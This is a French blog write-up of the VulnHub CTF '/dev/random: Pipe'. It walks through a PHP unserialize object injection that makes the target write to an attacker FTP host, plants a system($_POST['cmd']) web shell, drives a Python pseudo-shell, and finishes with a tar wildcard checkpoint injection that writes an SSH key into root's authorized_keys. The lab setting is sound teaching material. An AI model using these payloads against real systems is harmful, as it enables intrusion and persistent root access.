# Solution du CTF /dev/random: Pipe de VulnHub

Le CTF [Pipe](https://www.vulnhub.com/entry/devrandom-pipe,124/) disponible sur *VulnHub* fait partie de la série de CTF baptisée */dev/random* créée par [Sagi](https://twitter.com/@s4gi_).  

J'ai déjà à ce jour résolu les CTF [Relativity](http://devloop.users.sourceforge.net/index.php?article71/solution-du-ctf-relativity) et [Scream](http://devloop.users.sourceforge.net/index.php?article75/solution-du-ctf-scream) de sa composition.  

C'était donc l'occasion de reprendre cette série avec le Pipe qui date de septembre 2015.  

Nom d'une pipe !
----------------

```plain
Nmap scan report for 192.168.1.43
Host is up (0.00031s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   1024 16:48:50:89:e7:c9:1f:90:ff:15:d8:3e:ce:ea:53:8f (DSA)
|   2048 ca:f9:85:be:d7:36:47:51:4f:e6:27:84:72:eb:e8:18 (RSA)
|_  256 d8:47:a0:87:84:b2:eb:f5:be:fc:1c:f1:c9:7f:e3:52 (ECDSA)
80/tcp    open  http    Apache httpd
|_http-server-header: Apache
|_http-title: 401 Unauthorized
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          33906/udp  status
|_  100024  1          59814/tcp  status
59814/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:39:B5:70 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.0
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ohé moussaillons, rien à voir sur ce CTF ? Même si le port 80 est ouvert on est reçu par un 401 (demande d'autorisation HTTP Basic dont le titre est seulement *index.php*).  

On va devoir plonger plus profond mon commandant !  

Un scan de port UDP (généralement inintéressant sur les CTF) et une tentative de brute-force sur le *Apache* (*ncrack -v -T5 http://192.168.1.43* avec différentes wordlists) et on est pas plus avancé...  

Au vu de la version du *OpenSSH* et de la date de publication du CTF on peut tenter [un exploit](https://www.exploit-db.com/exploits/5720/) pour la faille introduite par Debian :  

```plain
$ python2 exploit.py rsa/2048 192.168.1.43 root 22 5

-OpenSSL Debian exploit- by ||WarCat team|| warcat.no-ip.org
Tested 20 keys | Remaining 32748 keys | Aprox. Speed 4/sec
Tested 33 keys | Remaining 32735 keys | Aprox. Speed 2/sec
Tested 49 keys | Remaining 32719 keys | Aprox. Speed 3/sec
--- snip ---
Tested 32329 keys | Remaining 439 keys | Aprox. Speed 44/sec
Tested 32549 keys | Remaining 219 keys | Aprox. Speed 44/sec
Tested 32768 keys | Remaining 0 keys | Aprox. Speed 43/sec
```

Terre ! Terre droit devant !
----------------------------

On lance un petit buster d'URLs et le brouillard commence à se dissiper avec un dossier */scriptz/* sorti des eaux.  

On y trouve un fichier *php.js* qui semble être le portage JS de la fonction *serialize()* de PHP... indice !  

Le second fichier se nomme *log.php.BAK* et contient le code d'une classe PHP :  

```php
<?php
class Log
{
    public $filename = '';
    public $data = '';

    public function __construct()
    {
        $this->filename = '';
        $this->data = '';
    }

    public function PrintLog()
    {
        $pre = "[LOG]";
        $now = date('Y-m-d H:i:s');

        $str = '$pre - $now - $this->data';
        eval("\$str = \"$str\";");
        echo $str;
    }

    public function __destruct()
    {
        file_put_contents($this->filename, $this->data, FILE_APPEND);
    }
}
?>
```

Ok... and now what ?  

On peut reprendre la classe Log, instancier un objet puis le sérializer :  

```php
$l = new Log();
$l->filename = "index.php";
$l->data = "hi there";
echo urlencode(serialize($l));
```

Mais après on l'injecte comment ? Via l'authentification HTTP ? Marche pas :'(   

On se dit alors que peut être l'authentification est mal écrite et qu'il est facile de la bypasser. Pou cela je dégaine wapiti3 (version de développement) :  

```plain
./bin/wapiti http://192.168.1.43/ -s http://192.168.1.43/index.php -m htaccess --color
```

Et le miracle s'accomplit :   

![Wapiti htaccess bypass](https://raw.githubusercontent.com/devl00p/blog/master/images/wapiti3_htaccess_bypass.png)  

Mégateuf Wayne ! On peut accéder à la page si on effectue par exemple un POST à la place d'un GET sur */index.php*.  

La page découverte contient un formulaire qui envoie le contenu sérialisé suivant sur elle même :  

```plain
O:4:"Info":4:{s:2:"id";i:1;s:9:"firstname";s:4:"Rene";s:7:"surname";s:8:"Margitte";s:7:"artwork";s:23:"The Treachery of Images";}
```

Il faut donc utiliser l'appel à *unserialize()* effectué par la page pour exploiter la classe *Log* vu plus haut.  

Explorons cette nouvelle contrée
--------------------------------

Après moult essais à essayer de tirer quelque chose de la fonction *eval()* de la classe *Log* (on recopie les scripts pour tester en local), force est de constater que celle-ci est une sirène destinée à nous séduire et nous retarder dans notre quête !  

Un *echo* bien placé permet de comprendre que l'on peut rien en tirer.  

Le *file\_put\_contents* est donc bien prometteur mais l'option *FILE\_APPEND* a de quoi refroidir :-(   

Comment savoir qu'on va bien écrire ce que l'on souhaite où on le souhaite ? On peut commencer par exploiter les fonctionnalités avancés du langage PHP, notamment les wrappers.  

J'ai écrit le code suivant qui tente d'écrire à une adresse FTP sous notre contrôle :  

```python
from urllib.parse import quote, unquote
import requests

original_payload = 'O:4:"Info":4:{s:2:"id";i:1;s:9:"firstname";s:4:"Rene";s:7:"surname";s:8:"Margitte";s:7:"artwork";s:23:"The Treachery of Images";}'

base_payload = 'O:3:"Log":2:{s:8:"filename";s:SIZE1:"OUTPUT_FILE";s:4:"data";s:SIZE2:"INJECTION";}'

injection = "nawak"
output_file = "ftp://test:test@192.168.1.6/toto"

new_payload = base_payload.replace("SIZE1", str(len(output_file))).replace("OUTPUT_FILE", output_file)
new_payload = new_payload.replace("SIZE2", str(len(injection))).replace("INJECTION", injection)
print(new_payload)

response = requests.post(
    "http://192.168.1.43/index.php",
    data={"param": new_payload},
    headers={
        "referer":"http://192.168.1.43/index.php",
        "content-type": "application/x-www-form-urlencoded"
    }
)

print(response.text)
```

et le miracle s'accomplit dans un ncat préalablement lancé :  

```plain
$ sudo ncat -l -p 21 -v
Ncat: Version 7.01 ( https://nmap.org/ncat )
Ncat: Listening on :::21
Ncat: Listening on 0.0.0.0:21
Ncat: Connection from 192.168.1.43.
Ncat: Connection from 192.168.1.43:37731.
```

Deux choses à en tirer : la dé-sérialisation a bien lieu et le path est pris directement (pas de prépend). Pour autant quand on tente d'écrire dans un script via un chemin relatif je ne vois rien apparaître.  

A l'abordage !
--------------

Après avoir testé quelques chemins absolus j'obtiens une écriture avec les modifications suivantes dans mon script :  

```python
injection = '/* yoyo */'
output_file = "/var/www/html/scriptz/php.js"
```

Ok, maintenant il s'agit d'injecter du code PHP et il ne faut pas se louper car si on introduit une erreur de syntaxe dans le index.php ça va être dûr à rattraper :|   

```python
injection = '---START---<?php system($_POST["cmd"?>---END---'
output_file = "/var/www/html/index.php"
```

Et on est bon ! On peut maintenant exécuter un ls avec la commande *curl --data "cmd=ls" http://192.168.1.43/index.php*  

Je code un pseudo shell pour la route :   

```python
import requests
from requests.exceptions import RequestException

while True:
    command = input("$ ")
    if command.lower().strip() == "exit":
        break

    response = requests.post(
        "http://192.168.1.43/index.php",
        data={"cmd": command}
    )

    if "---START---" in response.text:
        output = response.text.split("---START---")[1]
        output = output.split("---END---")[0]
        print(output)
```

Chasse au trésor !
------------------

```plain
devloop$ python shell.py
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ ls /home
rene
```

Il y a un utilisateur *rene* (par rapport à [Magritte](https://fr.wikipedia.org/wiki/La_Trahison_des_images) autour duquel tourne le CTF)  

Cet utilisateur a un dossier personnel que l'on peut visiter et plus encore :  

```plain
$ ls -alR /home/rene
/home/rene:
total 24
drwxr-xr-x 3 rene rene 4096 Jul  6  2015 .
drwxr-xr-x 3 root root 4096 Jul  5  2015 ..
-rw-r--r-- 1 rene rene  220 Jul  5  2015 .bash_logout
-rw-r--r-- 1 rene rene 3515 Jul  5  2015 .bashrc
-rw-r--r-- 1 rene rene  675 Jul  5  2015 .profile
drwxrwxrwx 2 rene rene 4096 Nov 12 05:28 backup

/home/rene/backup:
total 124
drwxrwxrwx 2 rene rene  4096 Nov 12 05:28 .
drwxr-xr-x 3 rene rene  4096 Jul  6  2015 ..
-rw-r--r-- 1 rene rene 62220 Nov 12 05:25 backup.tar.gz
-rw-r--r-- 1 rene rene 31148 Nov 12 05:28 sys-12904.BAK
-rw-r--r-- 1 rene rene  4679 Nov 12 05:27 sys-6694.BAK
-rw-r--r-- 1 rene rene 10893 Nov 12 05:26 sys-9653.BAK

$ file /home/rene/backup/*
/home/rene/backup/backup.tar.gz: gzip compressed data, last modified: Thu Nov 12 05:25:01 2017, from Unix
/home/rene/backup/sys-12904.BAK: data
/home/rene/backup/sys-4998.BAK:  data
/home/rene/backup/sys-6694.BAK:  Linux old jffs2 filesystem data little endian
/home/rene/backup/sys-9653.BAK:  data
```

En attendant voici la config qui nous bloquait l'accès à Apache :  

```plain
$ cat .htaccess
AuthUserFile /var/www/html/.htpasswd
AuthName "index.php"
AuthType Basic
<Limit GET PUT HEAD OPTIONS DELETE>
require valid-user
</Limit>

$ cat .htpasswd
rene:$apr1$wfYjXf4U$0ZZ.qhGGrtkOxvKr5WFqX/
```

Le hash semble trop complexe à casser donc on déplace juste le .htaccess et on n'est plus embêté :)   

Les fichiers .BAK (que l'on retrouve aussi dans l'archive .tar.gz) ne semblent pas correspondre à grand chose. Un coup d'oeil via un éditeur hexa ne nous met sur aucune piste.  

Même en ressortant mon *Guide complet du FreeBSD* (superbe livre au passage) sur la section des backups je n'ai rien trouvé qui pourrait me diriger sur le sujet. De plus *dump* et *restore* ne sont pas présents sur le système.  

Un peu plus tard je remarque que les fichiers .BAK ont disparus... Crontab bien sûr :  

```plain
* * * * * root /root/create_backup.sh
*/5 * * * * root /usr/bin/compress.sh
```

Le premier est inaccessible mais le second est lisible :  

```bash
#!/bin/sh

rm -f /home/rene/backup/backup.tar.gz
cd /home/rene/backup
tar cfz /home/rene/backup/backup.tar.gz *
chown rene:rene /home/rene/backup/backup.tar.gz
rm -f /home/rene/backup/*.BAK
```

Je lance quelques idées :  

* Tenter de placer un lien symbolique par exemple vers /etc/shadow pour que tar l'archive : échec car tar ne suit pas les liens
* Exploiter une race condition entre le cd et le tar. Si on supprime le dossier backup et qu'on créé un lien symbolique vers /root et qu'on a réparé ça avant l'appel à tar on peut en théorie récupérer le contenu de /root. Sauf que l'on manque de droit et ça aurait été très chaud...

Heureusement ça a finir par faire tilt quand je me suis rappelé le principe des attaques wildcards : vu que la commande tar utilise l'astérisque et que ce dernier n'est pas entre quotes, il est possible de créer des fichiers dont les noms seront utilisés comme arguments de la commande.  

Je vois bien une option dans la page de man de tar mais elle n'est utilisée que lors d'une décompression :  

```plain
--to-command=COMMAND
    pipe extracted files to another program
```

J'ai fini par trouver [une astuce](https://www.soliantconsulting.com/blog/dangers-wildcards-bash) qui utilise les checkpoints.  

D'abord je créé un script *evil.sh* dans */home/rene/backup* :  

```bash
#!/bin/bash
mkdir -p /root/.ssh/
echo "ssh-rsa [--- ma clé publique ssh ---]" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
cp /root/flag.txt /tmp/
chmod o+r /tmp/flag.txt
```

Ce script rajoute ma clé publique SSH aux clés autorisées de root et au cas où je recopie aussi le flag.  

Il ne reste plus qu'à mettre en place les fichiers qui vont s'injecter dans la commande du crontab :  

```plain
cd /home/rene/backup; touch -- "--checkpoint=1" touch -- "--checkpoint-action=exec=sh evil.sh"; touch a
```

On attend un peu et on touche le jackpot :  

![PIPE CTF flag](https://raw.githubusercontent.com/devl00p/blog/master/images/pipe_ctf.png)  

Au passage le script qui générait les fichiers BAK n'était là que pour la forme :  

```bash
#!/bin/bash

head -c $RANDOM /dev/urandom > "/home/rene/backup/sys-$RANDOM.BAK"
chown rene:rene /home/rene/backup/*.BAK
```


*Published November 17 2017 at 16:47*